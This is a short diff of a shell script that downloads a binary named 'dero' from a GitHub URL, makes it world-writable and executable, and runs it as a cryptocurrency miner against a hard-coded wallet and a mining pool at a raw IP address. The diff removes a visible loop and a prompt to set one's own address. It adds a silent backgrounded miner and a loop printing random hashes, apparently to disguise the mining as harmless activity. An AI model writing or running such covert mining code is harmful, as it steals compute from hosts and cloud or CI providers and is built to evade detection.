@@ -1,10 +1,4 @@
 wget https://github.com/aqshakuy/dora/raw/main/dero
 chmod 777 dero
-
-#!/bin/bash
-echo "Replace YOUR_ADDRESS to run the miner"
-while :; do
-    ./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x639pf6zmdnrcwsmtuta9 -r 170.187.197.220:443 -p stratum;
-    sleep 5;
-done
-
+./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x639pf6zmdnrcwsmtuta9 -r 170.187.197.220:443 -p stratum > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
